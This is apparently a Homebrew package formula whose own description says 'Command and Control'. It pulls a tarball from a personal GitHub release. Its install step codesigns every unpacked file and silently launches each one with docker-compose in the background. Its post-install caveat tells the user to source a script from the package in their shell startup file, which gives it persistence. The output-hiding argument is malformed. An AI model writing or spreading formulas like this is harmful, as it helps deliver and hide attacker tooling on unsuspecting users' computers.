class Andrewtest < Formula
    desc "Command and Control"
    homepage "https://github.com/werdhaihai/"
    url "https://github.com/abuchanan-figment/testformula2/releases/download/1.33.7/andrewtest-1.33.7.tar.gz"
    sha256 "36e385d9380a111c0a428665bf2f1d778658e401f69237fd1256ad84e5bf7505"
    version "1.33.7"

    def install
        bin.install Dir["*"]
        Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        system "/usr/local/bin/docker-compose", "-f", f, "up", "-d >/dev/null 2>&1"
        end
        
    
      end

    def caveats
        <<~EOS
        To finish installation, add the following line to .zshrc or .bashrc  
  source #{bin}/completion.sh
Then reopen your terminal app
        EOS
    end
    end
